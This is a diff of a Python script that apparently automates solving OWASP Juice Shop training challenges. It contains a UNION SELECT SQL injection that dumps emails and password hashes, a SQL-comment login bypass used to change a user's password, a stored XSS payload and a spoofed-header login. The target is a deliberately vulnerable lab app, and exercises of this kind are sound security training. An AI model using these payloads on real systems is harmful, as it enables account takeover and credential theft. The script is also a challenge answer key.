@@ -25,8 +25,9 @@ def get_users_with_sql_injection(server):
     :param server: juice shop URL
     """
     session = get_admin_session(server)
-    injection = "test')) UNION SELECT NULL,email,password,NULL,NULL,NULL,NULL,NULL FROM USERS--"
-    users = session.get('{}/rest/product/search?q={}'.format(server, injection))
+    #injection = "test')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM USERS--"
+    injection = "test%27))%20UNION%20SELECT%20id,email,password,NULL,NULL,NULL,NULL,NULL,NULL%20FROM%20USERS--"
+    users = session.get('{}/rest/products/search?q={}'.format(server, injection))
     if not users.ok:
         raise RuntimeError('Error with SQLi attempt.')
     print('Found email and password hashes with SQLi, printing...')
@@ -43,7 +44,7 @@ def change_bender_password(server):
     session = get_session(server, "bender@juice-sh.op'--", 'anything')
     newpass = 'slurmCl4ssic'
     changeurl = '{}/rest/user/change-password?new={newpass}&repeat={newpass}'.format(server, newpass=newpass)
-    print('Changing Bender\'s password...'),
+    print('Changing Bender\'s password...', end=''),
     update = session.get(changeurl)
     if not update.ok:
         raise RuntimeError('Error updating Bender\'s password.')
@@ -56,7 +57,7 @@ def create_user_with_xss2_payload(server):
     :param server: juice shop URL.
     """
     xss2 = '<script>alert("XSS2")</script>'
-    print('Creating user account with malicious XSS2 as email...'),
+    print('Creating user account with malicious XSS2 as email...', end=''),
     create_user(server, xss2, 'password')
     print('Success.')
 
@@ -95,7 +96,7 @@ def login_as_ciso(server):
     :param server: juice shop URL
     """
     headers = {'Content-Type': 'application/json', 'X-User-Email': 'ciso@juice-sh.op'}
-    print('Logging in as CISO using spoofed header and OAuth...'),
+    print('Logging in as CISO using spoofed header and OAuth...', end=''),
     session = get_session(server, 'admin@juice-sh.op', 'admin123', headers=headers, oauth=True)
     print('Success.')
     del session
@@ -103,10 +104,10 @@ def login_as_ciso(server):
 
 def solve_user_challenges(server):
     print('\n== USER CHALLENGES ==\n')
-    login_all_users_with_sqli(server)
+    #login_all_users_with_sqli(server)
     get_users_with_sql_injection(server)
     create_user_with_xss2_payload(server)
     change_bender_password(server)
-    login_as_bjoern(server)
+    #login_as_bjoern(server)
     login_as_ciso(server)
     print('\n== END USER CHALLENGES ==\n')
